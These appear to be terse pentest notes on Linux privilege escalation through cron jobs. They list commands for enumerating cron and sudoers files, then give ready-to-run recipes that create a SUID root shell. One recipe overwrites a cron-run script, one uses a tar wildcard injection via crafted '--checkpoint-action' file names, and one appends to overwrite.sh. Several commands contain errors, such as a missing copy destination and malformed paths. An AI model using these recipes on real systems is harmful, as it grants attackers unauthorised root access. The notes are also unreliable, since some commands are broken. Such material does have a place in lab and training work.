

   ### Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
   ### Cron table files (crontabs) store the configuration for cron jobs. 
   ### The system-wide crontab is located at /etc/crontab.
    
          cat /etc/crontab
          locate overwrite.sh
          
          
          
   
### Cron jobs

Check if you have access with write permission on these files.   
Check inside the file, to find other paths with write permissions.   

```powershell
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```
          
          
          
          
   ## overwrite.sh Exploit
      
       touch /home/user/overwrite.sh
       echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
       chmod +x /home/user/overwrite.sh
       /tmp/bash -p




   ## compress.sh
   
      cat <PATH=compress.sh>
      
   ## OUTPUT
   
          #!/bin/sh
          cd /home/user
          tar czf /tmp/backup.tar.gz *
          
   ## Exploit wildcards
   
        echo 'cp /bin/bash/ /tmp/bash; chmod +s /tmp/bash' > asif.sh
        chmod 777 asif.sh
        touch /home/user/--checkpoint=1
        touch /home/user/--checkpoint-action=exec=sh\asif.sh
        /tmp//bash -p
        
        
        
        
        
   ## Change File permissions And Exploit
   
       locate overwrite.sh
       echo 'cp /bin/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
       /tmp/bash -p
   
   
   
   
     
